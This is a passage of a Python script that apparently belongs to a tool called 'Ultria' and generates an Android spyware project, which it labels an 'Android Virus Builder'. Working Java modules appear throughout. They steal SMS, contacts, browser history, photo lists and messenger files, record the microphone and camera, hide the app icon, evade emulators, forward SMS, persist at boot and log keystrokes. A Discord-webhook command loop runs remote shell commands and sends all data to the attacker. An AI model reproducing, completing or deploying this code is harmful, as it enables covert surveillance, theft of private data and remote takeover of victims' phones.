                "Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\\n" +
                "Device: " + Build.DEVICE + "\\n" +
                "Brand: " + Build.BRAND + "\\n" +
                "Board: " + Build.BOARD;
            sendWebhook("System Info", info);
        }} catch (Exception ignored) {{}}
    }}
""" if opt_sysinfo == "Enable" else ""

    JAVA_MICROPHONE = """
    private void recordMicrophone() {
        try {
            File outFile = new File(getExternalCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
            MediaRecorder mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mr.setOutputFile(outFile.getAbsolutePath());
            mr.setMaxDuration(8000);
            mr.prepare(); mr.start();
            Thread.sleep(9000);
            mr.stop(); mr.release();
            sendFile(outFile.getAbsolutePath(), outFile.getName());
            outFile.delete();
        } catch (Exception ignored) {}
    }
""" if opt_microphone == "Enable" else ""

    JAVA_SCREENSHOT = """
    private void takeScreenshot() {
        try {
            android.view.View rootView = getWindow().getDecorView().getRootView();
            rootView.setDrawingCacheEnabled(true);
            Bitmap bmp = Bitmap.createBitmap(rootView.getDrawingCache());
            rootView.setDrawingCacheEnabled(false);
            File f = new File(getCacheDir(), "screen_" + System.currentTimeMillis() + ".png");
            try (FileOutputStream fos = new FileOutputStream(f)) {
                bmp.compress(Bitmap.CompressFormat.PNG, 90, fos);
            }
            sendFile(f.getAbsolutePath(), f.getName());
            f.delete();
        } catch (Exception ignored) {}
    }
""" if opt_screenshot == "Enable" else ""

    JAVA_HIDE_ICON = f"""
    private void hideIcon() {{
        try {{
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        }} catch (Exception ignored) {{}}
    }}
""" if opt_hide_icon == "Enable" else ""

    JAVA_ANTI_EMU = """
    private boolean isEmulator() {
        return Build.FINGERPRINT.contains("generic") ||
               Build.FINGERPRINT.contains("unknown") ||
               Build.MODEL.contains("Emulator") ||
               Build.MODEL.contains("Android SDK") ||
               Build.MANUFACTURER.contains("Genymotion") ||
               Build.HARDWARE.equals("goldfish") ||
               Build.HARDWARE.equals("ranchu") ||
               Build.PRODUCT.contains("sdk") ||
               Build.PRODUCT.contains("emulator");
    }
""" if opt_anti_emu == "Enable" else ""

    JAVA_BROWSER = """
    private void stealBrowserHistory() {
        try {
            String[] proj = {"url", "title", "date"};
            Uri uri = Uri.parse("content://browser/bookmarks");
            Cursor c = getContentResolver().query(uri, proj, "bookmark = 0", null, "date DESC");
            StringBuilder sb = new StringBuilder();
            if (c != null) {
                while (c.moveToNext()) {
                    String url   = c.getString(0);
                    String title = c.getString(1);
                    sb.append(title != null ? title : url).append("\\n  ").append(url).append("\\n---\\n");
                    if (sb.length() > 3500) break;
                }
                c.close();
            }
            if (sb.length() > 0) sendWebhook("Browser History", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_browser == "Enable" else ""

    JAVA_WHATSAPP = """
    private void stealWhatsApp() {
        try {
            java.io.File waDir = new java.io.File("/sdcard/WhatsApp/Databases/");
            if (waDir.exists()) {
                java.io.File[] files = waDir.listFiles();
                StringBuilder sb = new StringBuilder("WhatsApp backup files:\\n");
                if (files != null) {
                    for (java.io.File f : files)
                        sb.append(f.getName()).append(" (").append(f.length() / 1024).append(" KB)\\n");
                }
                if (sb.length() > 40) sendWebhook("WhatsApp Databases", sb.toString());
            }
            // shared media count
            java.io.File media = new java.io.File("/sdcard/WhatsApp/Media/");
            if (media.exists()) {
                int count = 0;
                java.io.File[] dirs = media.listFiles();
                if (dirs != null) for (java.io.File d : dirs) {
                    java.io.File[] items = d.listFiles();
                    if (items != null) count += items.length;
                }
                sendWebhook("WhatsApp Media", "Total media files: " + count);
            }
        } catch (Exception ignored) {}
    }
""" if opt_whatsapp == "Enable" else ""

    JAVA_TELEGRAM = """
    private void stealTelegram() {
        try {
            java.io.File tgDir = new java.io.File("/sdcard/Telegram/");
            if (!tgDir.exists()) tgDir = new java.io.File(getExternalFilesDir(null), "../../../Telegram/");
            if (tgDir.exists()) {
                StringBuilder sb = new StringBuilder("Telegram folder contents:\\n");
                java.io.File[] entries = tgDir.listFiles();
                if (entries != null) {
                    for (java.io.File f : entries)
                        sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append("\\n");
                }
                sendWebhook("Telegram Data", sb.toString());
            }
        } catch (Exception ignored) {}
    }
""" if opt_telegram == "Enable" else ""

    JAVA_PHOTOS = """
    private void stealPhotosList() {
        try {
            String[] proj = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.SIZE,
                             MediaStore.Images.Media.DATE_TAKEN};
            Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC");
            StringBuilder sb = new StringBuilder();
            int count = 0;
            if (c != null) {
                while (c.moveToNext() && count < 80) {
                    String path = c.getString(0);
                    long   size = c.getLong(1) / 1024;
                    sb.append(path).append(" (").append(size).append(" KB)\\n");
                    count++;
                }
                c.close();
            }
            if (sb.length() > 0) sendWebhook("Photos List (" + count + ")", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_photos == "Enable" else ""

    _cam_id = "0" if opt_camera_front == "Enable" else "1"
    JAVA_CAMERA = f"""
    private void captureCamera() {{
        try {{
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return;
            String camId = "{_cam_id}";
            android.util.Size[] sizes = cm.getCameraCharacteristics(camId)
                .get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                .getOutputSizes(ImageFormat.JPEG);
            android.util.Size best = sizes[sizes.length - 1];
            ImageReader reader = ImageReader.newInstance(best.getWidth(), best.getHeight(), ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {{
                android.media.Image image = r.acquireNextImage();
                if (image == null) return;
                java.nio.ByteBuffer buf = image.getPlanes()[0].getBuffer();
                byte[] data = new byte[buf.remaining()];
                buf.get(data);
                image.close();
                java.io.File f = new java.io.File(getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
                try (java.io.FileOutputStream fos = new java.io.FileOutputStream(f)) {{
                    fos.write(data);
                }}
                sendFile(f.getAbsolutePath(), f.getName());
                f.delete();
            }}, null);
            cm.openCamera(camId, new CameraDevice.StateCallback() {{
                @Override public void onOpened(CameraDevice cam) {{
                    try {{
                        cam.createCaptureSession(java.util.Arrays.asList(reader.getSurface()),
                            new android.hardware.camera2.CameraCaptureSession.StateCallback() {{
                                @Override public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {{
                                    try {{
                                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(reader.getSurface());
                                        s.capture(b.build(), null, null);
                                    }} catch (Exception ignored) {{}}
                                }}
                                @Override public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) {{}}
                            }}, null);
                    }} catch (Exception ignored) {{}}
                }}
                @Override public void onDisconnected(CameraDevice cam) {{ cam.close(); }}
                @Override public void onError(CameraDevice cam, int e) {{ cam.close(); }}
            }}, null);
        }} catch (Exception ignored) {{}}
    }}
""" if (opt_camera_front == "Enable" or opt_camera_back == "Enable") else ""

    # ── C2 Heartbeat (Android Java) ───────────────────────────────────────────
    JAVA_C2 = f"""
    private String c2MsgId = null;

    private String c2Post(String desc) {{
        try {{
            String body = "{{\\"embeds\\":[{{\\"title\\":\\"[C2] " + Build.MODEL + "\\",\\"description\\":\\"" + desc + "\\",\\"color\\":11206149}}],\\"username\\":\\"Ultria C2\\"}}";
            URL url = new URL(WEBHOOK_PRIMARY + "?wait=true");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST"); c.setRequestProperty("Content-Type","application/json");
            c.setDoOutput(true); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            try (OutputStream os = c.getOutputStream()) {{ os.write(body.getBytes("UTF-8")); }}
            if (c.getResponseCode() == 200) {{
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                String resp = sb.toString();
                int idx = resp.indexOf("\\"id\\":\\"");
                if (idx >= 0) {{
                    int end = resp.indexOf("\\"", idx + 6);
                    return resp.substring(idx + 6, end);
                }}
            }}
            c.disconnect();
        }} catch (Exception ignored) {{}}
        return null;
    }}

    private String c2GetDesc() {{
        if (c2MsgId == null) return null;
        try {{
            URL url = new URL(WEBHOOK_PRIMARY + "/messages/" + c2MsgId);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("GET"); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            if (c.getResponseCode() == 200) {{
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                String resp = sb.toString();
                int idx = resp.indexOf("\\"description\\":\\"");
                if (idx >= 0) {{
                    int end = resp.indexOf("\\"", idx + 16);
                    return resp.substring(idx + 16, end);
                }}
            }}
            c.disconnect();
        }} catch (Exception ignored) {{}}
        return null;
    }}

    private void c2Patch(String desc) {{
        if (c2MsgId == null) return;
        try {{
            String body = "{{\\"embeds\\":[{{\\"title\\":\\"[C2] " + Build.MODEL + "\\",\\"description\\":\\"" + desc + "\\",\\"color\\":11206149}}]}}";
            URL url = new URL(WEBHOOK_PRIMARY + "/messages/" + c2MsgId);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("PATCH"); c.setRequestProperty("Content-Type","application/json");
            c.setDoOutput(true); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            try (OutputStream os = c.getOutputStream()) {{ os.write(body.getBytes("UTF-8")); }}
            c.getResponseCode(); c.disconnect();
        }} catch (Exception ignored) {{}}
    }}

    private void c2Result(String text) {{
        sendWebhook("[RESULT] " + Build.MODEL, text);
    }}

    private void c2ExecCmd(String cmd) {{
        try {{
            if (cmd.startsWith("CMD::shell::")) {{
                String sh = cmd.substring(12);
                try {{
                    Process p = Runtime.getRuntime().exec(new String[]{{"/system/bin/sh","-c",sh}});
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = br.readLine()) != null) sb.append(line).append("\\n");
                    c2Result(sb.length() > 0 ? sb.toString() : "(no output)");
                }} catch (Exception e) {{ c2Result("Shell error: " + e.getMessage()); }}
            }} else if (cmd.startsWith("CMD::run::")) {{
                Runtime.getRuntime().exec(cmd.substring(10));
                c2Result("Launched: " + cmd.substring(10));
            }} else if (cmd.equals("CMD::screenshot")) {{
                takeScreenshot();
            }} else if (cmd.equals("CMD::sms")) {{
                stealSms();
            }} else if (cmd.equals("CMD::contacts")) {{
                stealContacts();
            }} else if (cmd.equals("CMD::location")) {{
                getLocation();
            }} else if (cmd.startsWith("CMD::sms_send::")) {{
                String[] pts = cmd.substring(15).split("::", 2);
                if (pts.length == 2) {{
                    android.telephony.SmsManager sm = android.telephony.SmsManager.getDefault();
                    sm.sendTextMessage(pts[0], null, pts[1], null, null);
                    c2Result("SMS sent to " + pts[0]);
                }}
            }} else if (cmd.equals("CMD::exit")) {{
                c2Result("Process killed.");
                System.exit(0);
            }}
        }} catch (Exception ignored) {{}}
    }}

    private void startC2Loop() {{
        new Thread(() -> {{
            c2MsgId = c2Post("`" + Build.MODEL + "` | READY");
            if (c2MsgId != null) {{
                sendWebhook("[C2-REGISTER] " + Build.MODEL, "MSG_ID: " + c2MsgId);
            }}
            while (true) {{
                try {{ Thread.sleep(10000); }} catch (Exception ignored) {{}}
                try {{
                    if (c2MsgId == null) {{ c2MsgId = c2Post("`" + Build.MODEL + "` | READY"); continue; }}
                    String desc = c2GetDesc();
                    if (desc != null && desc.startsWith("CMD::")) {{
                        c2Patch("`" + Build.MODEL + "` | RUNNING...");
                        c2ExecCmd(desc.trim());
                        c2Patch("`" + Build.MODEL + "` | READY");
                    }}
                }} catch (Exception ignored) {{}}
            }}
        }}).start();
    }}
""" if opt_c2 == "Enable" else ""

    # ── All module calls in runModules() ──────────────────────────────────────
    module_calls = []
    if opt_anti_emu == "Enable": module_calls.append("if (isEmulator()) return;")
    if opt_hide_icon == "Enable": module_calls.append("hideIcon();")
    if opt_sysinfo == "Enable": module_calls.append("stealSysInfo();")
    if opt_sms == "Enable": module_calls.append("stealSms();")
    if opt_contacts == "Enable": module_calls.append("stealContacts();")
    if opt_calllogs == "Enable": module_calls.append("stealCallLogs();")
    if opt_location == "Enable": module_calls.append("getLocation();")
    if opt_wifi == "Enable": module_calls.append("stealWifi();")
    if opt_installedapps == "Enable": module_calls.append("stealInstalledApps();")
    if opt_browser == "Enable": module_calls.append("stealBrowserHistory();")
    if opt_whatsapp == "Enable": module_calls.append("stealWhatsApp();")
    if opt_telegram == "Enable": module_calls.append("stealTelegram();")
    if opt_photos == "Enable": module_calls.append("stealPhotosList();")
    if opt_microphone == "Enable": module_calls.append("recordMicrophone();")
    if opt_screenshot == "Enable": module_calls.append("takeScreenshot();")
    if opt_camera_front == "Enable" or opt_camera_back == "Enable": module_calls.append("captureCamera();")
    if opt_c2 == "Enable": module_calls.append("startC2Loop();")

    calls_str = "\n            ".join(module_calls)

    # ── Runtime permissions list ──────────────────────────────────────────────
    dangerous_perms = [p for p in perms if p in [
        "android.permission.READ_SMS","android.permission.RECEIVE_SMS","android.permission.SEND_SMS",
        "android.permission.READ_CONTACTS","android.permission.READ_CALL_LOG",
        "android.permission.ACCESS_FINE_LOCATION","android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO","android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE","android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES","android.permission.READ_PHONE_STATE",
    ]]
    perm_array = ", ".join(f'"{p}"' for p in dangerous_perms) if dangerous_perms else '"android.permission.INTERNET"'

    # ── MainActivity.java ─────────────────────────────────────────────────────
    main_activity = f"""package {package_name};

{IMPORTS_BASE}
{chr(10).join(IMPORTS_EXTRA)}

public class MainActivity extends Activity {{

{JAVA_SEND_WEBHOOK}
{JAVA_SMS}
{JAVA_CONTACTS}
{JAVA_CALLLOGS}
{JAVA_LOCATION}
{JAVA_WIFI}
{JAVA_INSTALLED_APPS}
{JAVA_SYSINFO}
{JAVA_MICROPHONE}
{JAVA_SCREENSHOT}
{JAVA_HIDE_ICON}
{JAVA_ANTI_EMU}
{JAVA_BROWSER}
{JAVA_WHATSAPP}
{JAVA_TELEGRAM}
{JAVA_PHOTOS}
{JAVA_CAMERA}
{JAVA_C2}

    private void runModules() {{
        {calls_str if calls_str else "// No modules selected"}
    }}

    private static final String[] RUNTIME_PERMS = {{ {perm_array} }};

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {{
            List<String> needed = new ArrayList<>();
            for (String p : RUNTIME_PERMS) {{
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                    needed.add(p);
            }}
            if (!needed.isEmpty()) {{
                ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 1);
            }} else {{
                new Thread(this::runModules).start();
            }}
        }} else {{
            new Thread(this::runModules).start();
        }}
    }}

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {{
        new Thread(this::runModules).start();
    }}
}}
"""

    # ── BootReceiver.java ─────────────────────────────────────────────────────
    boot_receiver_java = f"""package {package_name};
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context ctx, Intent intent) {{
        Intent i = new Intent(ctx, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }}
}}
""" if opt_boot == "Enable" else None

    # ── SmsReceiver.java ──────────────────────────────────────────────────────
    fwd_num = sms_fwd_number if sms_fwd_number else "+10000000000"
    sms_receiver_java = f"""package {package_name};
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
public class SmsReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context ctx, Intent intent) {{
        Bundle b = intent.getExtras();
        if (b == null) return;
        Object[] pdus = (Object[]) b.get("pdus");
        if (pdus == null) return;
        for (Object pdu : pdus) {{
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
            String from = msg.getOriginatingAddress();
            String body = msg.getMessageBody();
            try {{
                SmsManager sm = SmsManager.getDefault();
                sm.sendTextMessage("{fwd_num}", null, "FWD from " + from + ": " + body, null, null);
            }} catch (Exception ignored) {{}}
        }}
    }}
}}
""" if opt_sms_forward == "Enable" else None

    # ── build.gradle (app) ────────────────────────────────────────────────────
    build_gradle_app = f"""plugins {{
    id 'com.android.application'
}}

android {{
    compileSdk 34
    defaultConfig {{
        applicationId "{package_name}"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }}
    buildTypes {{
        release {{
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }}
}}

dependencies {{
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.12.0'
}}
"""

    # ── build.gradle (root) ───────────────────────────────────────────────────
    build_gradle_root = """buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:8.2.2' }
}
allprojects {
    repositories { google(); mavenCentral() }
}
task clean(type: Delete) { delete rootProject.buildDir }
"""

    settings_gradle = f'rootProject.name = "{re.sub(r"[^\\w]","_",app_name)}"\ninclude \':app\'\n'

    strings_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{app_name}</string>
</resources>
"""

    build_bat = """@echo off
echo [Ultria] Building Android APK...
call gradlew.bat assembleDebug
if errorlevel 1 (
    echo.
    echo [ERROR] Build failed. Make sure Android SDK is installed and ANDROID_HOME is set.
    echo         Or open the project folder in Android Studio.
) else (
    echo.
    echo [OK] APK -> app\\build\\outputs\\apk\\debug\\app-debug.apk
)
pause
"""

    build_sh = """#!/bin/bash
echo "[Ultria] Building Android APK..."
chmod +x gradlew
./gradlew assembleDebug
if [ $? -eq 0 ]; then
    echo "[OK] APK -> app/build/outputs/apk/debug/app-debug.apk"
else
    echo "[ERROR] Build failed. Ensure ANDROID_HOME is set or open in Android Studio."
fi
"""

    # ── Write all files ───────────────────────────────────────────────────────
    def w(path, content):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    manifest_path   = os.path.join(out_root, "app", "src", "main", "AndroidManifest.xml")
    main_java_path  = os.path.join(java_dir, "MainActivity.java")
    strings_path    = os.path.join(res_dir, "strings.xml")
    build_app_path  = os.path.join(out_root, "app", "build.gradle")
    build_root_path = os.path.join(out_root, "build.gradle")
    settings_path   = os.path.join(out_root, "settings.gradle")
    proguard_path   = os.path.join(out_root, "app", "proguard-rules.pro")
    bat_path        = os.path.join(out_root, "build.bat")
    sh_path         = os.path.join(out_root, "build.sh")

    w(manifest_path,   manifest)
    w(main_java_path,  main_activity)
    w(strings_path,    strings_xml)
    w(build_app_path,  build_gradle_app)
    w(build_root_path, build_gradle_root)
    w(settings_path,   settings_gradle)
    w(proguard_path,   "# ProGuard rules\n-keep class " + package_name + ".** { *; }\n")
    w(bat_path,        build_bat)
    w(sh_path,         build_sh)

    if boot_receiver_java:
        w(os.path.join(java_dir, "BootReceiver.java"), boot_receiver_java)
    if sms_receiver_java:
        w(os.path.join(java_dir, "SmsReceiver.java"), sms_receiver_java)

    if opt_keylogger == "Enable":
        keylogger_java = f"""package {package_name};

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerService extends AccessibilityService {{
    private static final String WEBHOOK = "{webhook}";
    private final StringBuilder _buf = new StringBuilder();

    @Override
    public void onServiceConnected() {{
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                        | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }}

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {{
        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {{
            CharSequence text = e.getText().isEmpty() ? null : e.getText().get(0);
            if (text != null) {{
                String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "?";
                _buf.append("[").append(pkg).append("] ").append(text).append("\\n");
                if (_buf.length() > 1800) flush();
            }}
        }}
    }}

    @Override public void onInterrupt() {{}}

    private void flush() {{
        final String data = _buf.toString();
        _buf.setLength(0);
        new Thread(() -> {{
            try {{
                String safe = data.replace("\\\\", "\\\\\\\\").replace("\\"", "\\\\\\\"")
                              .replace("\\n", "\\\\n").replace("\\r", "");
                if (safe.length() > 3800) safe = safe.substring(0, 3800) + "...";
                String body = "{{\\"embeds\\":[{{\\"title\\":\\"[Keylog]\\",\\"description\\":\\"```\\\\n"
                              + safe + "\\\\n```\\",\\"color\\":11206149}}],\\"username\\":\\"Ultria Android\\"}}";
                URL url = new URL(WEBHOOK);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true); c.setConnectTimeout(6000); c.setReadTimeout(6000);
                try (OutputStream os = c.getOutputStream()) {{ os.write(body.getBytes("UTF-8")); }}
                c.getResponseCode(); c.disconnect();
            }} catch (Exception ignored) {{}}
        }}).start();
    }}
}}
"""
        xml_dir = os.path.join(out_root, "app", "src", "main", "res", "xml")
        accessibility_xml = """<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagReportViewIds"
    android:description="@string/app_name"
    android:notificationTimeout="100"/>
"""
        w(os.path.join(java_dir, "KeyloggerService.java"), keylogger_java)
        w(os.path.join(xml_dir, "accessibility_service_config.xml"), accessibility_xml)

    # Copy icon if provided
    if icon_path and icon_path != "None" and os.path.isfile(icon_path):
        shutil.copy2(icon_path, os.path.join(mipmap_dir, "ic_launcher.png"))
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Icon copied.")

    # ── Try auto-compile ──────────────────────────────────────────────────────
    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Project generated: {white}{out_root}")

    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    gradlew = os.path.join(out_root, "gradlew.bat" if sys.platform == "win32" else "gradlew")

    if android_home and os.path.isfile(gradlew):
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Android SDK found. Attempting auto-compile...")
        import subprocess
        try:
            result = subprocess.run(
                [gradlew, "assembleDebug"],
                cwd=out_root, capture_output=True, text=True, timeout=180
            )
            if result.returncode == 0:
                apk = os.path.join(out_root, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_VALID} APK built: {white}{apk}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Gradle build failed. Check output above.")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Auto-compile error: {white}{e}")
    else:
        print(f"""
{BEFORE + current_time_hour() + AFTER} {INFO} {white}To build the APK:
   {red}Option 1{white} — Open {out_root} in {red}Android Studio{white} → Build → Generate APK
   {red}Option 2{white} — Run {red}gradlew assembleDebug{white} (requires Android SDK + gradlew wrapper)
   {red}Option 3{white} — Run {red}build.bat{white} (Windows) or {red}build.sh{white} (Linux/Mac) in the output folder
""")

    messagebox.showinfo(
        f"{name_tool} {version_tool} - Android Virus Builder",
        f"Project generated:\n{out_root}\n\nOpen it in Android Studio to build the APK."
    )

except Exception as e:
    Error(e)

Continue()
